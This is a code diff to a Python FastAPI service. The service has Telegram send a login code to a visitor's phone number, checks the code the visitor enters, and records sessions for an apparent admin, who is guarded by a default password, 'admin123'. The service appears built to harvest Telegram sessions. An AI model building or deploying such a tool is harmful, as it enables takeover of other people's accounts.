@@ -1,7 +1,7 @@
 import os
 import sqlite3
 import asyncio
-from datetime import datetime, timedelta
+from datetime import datetime
 from fastapi import FastAPI, Request, Form
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
@@ -22,7 +22,7 @@ API_HASH = os.getenv("API_HASH")
 ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
 
 DB = "sessions.db"
-RESEND_COOLDOWN = 65  # seconds
+RESEND_COOLDOWN = 65
 
 # === DATABASE ===
 def init():
@@ -33,6 +33,14 @@ def init():
     conn.execute("CREATE TABLE IF NOT EXISTS last_sent (phone TEXT UNIQUE, time TEXT)")
     conn.commit()
     conn.close()
+
+# CLEAR DB ON START
+if os.getenv("CLEAR_DB") == "1":
+    import pathlib
+    if pathlib.Path(DB).exists():
+        pathlib.Path(DB).unlink()
+    os.environ.pop("CLEAR_DB", None)
+
 init()
 
 def phone_exists(phone):
@@ -112,13 +120,12 @@ def set_last_sent(phone):
     conn.commit()
     conn.close()
 
-# === SAFE RESEND ===
 async def send_code_safe(phone):
     last = get_last_sent(phone)
     if last:
         wait = RESEND_COOLDOWN - (datetime.utcnow() - last).total_seconds()
         if wait > 0:
-            return False, f"Wait {int(wait)} seconds before resending."
+            return False, f"Wait {int(wait)}s"
 
     delete_code_hash(phone)
     client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -129,14 +136,13 @@ async def send_code_safe(phone):
         set_last_sent(phone)
         await client.disconnect()
         clear_attempts(phone)
-        return True, "New code sent!"
+        return True, "Code sent!"
     except FloodWaitError as e:
-        return False, f"Wait {e.seconds} seconds (Telegram limit)."
+        return False, f"Wait {e.seconds}s"
     except Exception as e:
         await client.disconnect()
         return False, str(e)
 
-# === ROUTES ===
 @app.get("/", response_class=HTMLResponse)
 async def home(request: Request):
     phone = request.query_params.get("phone")
@@ -145,14 +151,14 @@ async def home(request: Request):
 @app.post("/send")
 async def send_code(phone: str = Form(...)):
     if phone_exists(phone):
-        return JSONResponse({"error": "You already have a session. Contact admin."})
+        return JSONResponse({"error": "Already have session."})
     success, msg = await send_code_safe(phone)
     return JSONResponse({"ok": success, "msg": msg} if success else {"error": msg})
 
 @app.post("/code")
 async def verify_code(phone: str = Form(...), code: str = Form(...)):
     if phone_exists(phone):
-        return JSONResponse({"error": "Session exists. Contact admin."})
+        return JSONResponse({"error": "Session exists."})
 
     attempts = inc_attempt(phone)
     if attempts > 3:
